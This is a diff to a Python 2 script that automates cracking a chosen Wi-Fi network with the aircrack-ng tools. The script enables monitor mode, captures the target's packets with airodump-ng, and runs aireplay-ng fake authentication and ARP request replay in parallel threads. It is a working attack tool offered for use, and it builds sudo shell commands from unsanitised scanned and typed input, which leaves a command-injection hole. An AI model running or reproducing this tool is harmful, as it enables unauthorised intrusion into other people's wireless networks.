@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import os
+import thread
 
 #After the handshake is caught run:
 ####################################################
@@ -19,9 +20,9 @@ def getNetworks(device):
     
     for i in range(0, len(rawNetworks), 3):
         refinedNetworks.append((rawNetworks[i].strip()[len(rawNetworks[i].strip())-17:len(rawNetworks[i].strip())],     #Gets the MAC Address
-                         rawNetworks[i+1].strip().strip('Channel:'),                                                    #Gets the channel
-                         rawNetworks[i+2].strip().strip('ESSID:').strip("\"")                                           #Gets the ESSID
-                         ))
+                                rawNetworks[i+1].strip().strip('Channel:'),                                                    #Gets the channel
+                                rawNetworks[i+2].strip().strip('ESSID:').strip("\"")                                           #Gets the ESSID
+                                ))
     return refinedNetworks
 
 def setNetworkInfo(networkList, target):
@@ -55,9 +56,37 @@ def printInfo():
     print "MAC: " + mac
     print "BSSID: " + bssid
     print "Channel: " + channel
-    print "ESSID: " + essid 
+    print "ESSID: " + essid
+    
+def startMonitoring():
+    os.system("sudo airmon-ng start " + device + " " + channel)
 
-#Do this to keep the later output clean
+def stopMonitoring():
+    os.system("sudo airmon-ng stop mon0")
+    
+def capturePackets():
+    os.system("sudo airodump-ng -c " + channel +" --bssid " + bssid +" -w output mon0 --ignore-negative-one")
+    
+def cleanUpFiles():
+        os.system("sudo rm -f output*")
+        os.system("sudo rm -f replay*")
+
+def printNetworks():
+    print "===================================="
+    networkList = getNetworks(device)
+    for item in networkList:
+        print item[2]
+    print "===================================="
+    
+def authenticateWithWPA():
+    command = "sudo aireplay-ng -1 0 -e " + essid + " -a " + bssid + " -h " + mac +" mon0 --ignore-negative-one"
+    os.system("gnome-terminal -e \"" + command + "\"")
+
+def replayARPRequest():
+    command = "sudo aireplay-ng -3 -b " + bssid + " -h " + mac + " mon0 --ignore-negative-one"
+    os.system("gnome-terminal -e \"" + command + "\"")
+
+#Do this to keep the output clean for later on
 os.system("sudo echo What device to use?")
 device = raw_input()
 mac = ''
@@ -65,26 +94,26 @@ bssid = ''
 channel = ''
 essid = ''
 
-print "===================================="
-networkList = getNetworks(device)
-for item in networkList:
-    print item[2]
-print "===================================="
 
+printNetworks()
 
-userinput = raw_input("Target ID?\n")
-if (userinput != "exit"):
-    setNetworkInfo(networkList, userinput)
+target = raw_input("Target ID?\n")
+if (target != "exit"):
     
-    setDeviceInfo(device)
+    try:
+        networkList = getNetworks(device)
+        setNetworkInfo(networkList, target)
+        setDeviceInfo(device)
+        
+        startMonitoring()
+        thread.start_new_thread(capturePackets, ())
+        thread.start_new_thread(authenticateWithWPA, ())
+        thread.start_new_thread(replayARPRequest, ())
+        
+        while 1:
+            pass
+    except:
+        pass
     
-    printInfo()
-    
-    #os.system("sudo stop network-manager")
-    #os.system("sudo ifconfig " + device + " down")
-    os.system("sudo airmon-ng start " + device + " " + channel)
-    os.system("sudo airodump-ng -c " + channel +" --bssid " + bssid +" -w output mon0 --ignore-negative-one")
-    
-    os.system("sudo airmon-ng stop mon0")
-    os.system("sudo rm -f output*")
-    #os.system("sudo start network-manager")
+    stopMonitoring()
+    cleanUpFiles()
